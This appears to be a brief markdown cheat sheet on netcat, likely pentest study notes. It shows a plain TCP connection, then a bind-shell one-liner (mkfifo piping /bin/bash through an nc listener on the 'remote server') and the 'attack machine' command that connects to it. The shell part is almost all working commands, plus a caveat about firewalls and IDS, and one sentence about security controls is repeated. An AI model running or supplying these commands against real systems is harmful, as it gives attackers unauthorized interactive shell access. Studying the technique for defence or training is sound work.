keep in mind that usually the server will have security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc... It will be much harder to pull this off in a real-world scenario

## tcp connection

remote server
```
nc -lvnp 7777
```

attack machine
```
nc -nv <remote_host_ip> 7777
```
---
## establishing a basic shell
 security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...)

remote server
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f
```

attack machine
```
nc -nv <remote_host_ip> 7777
```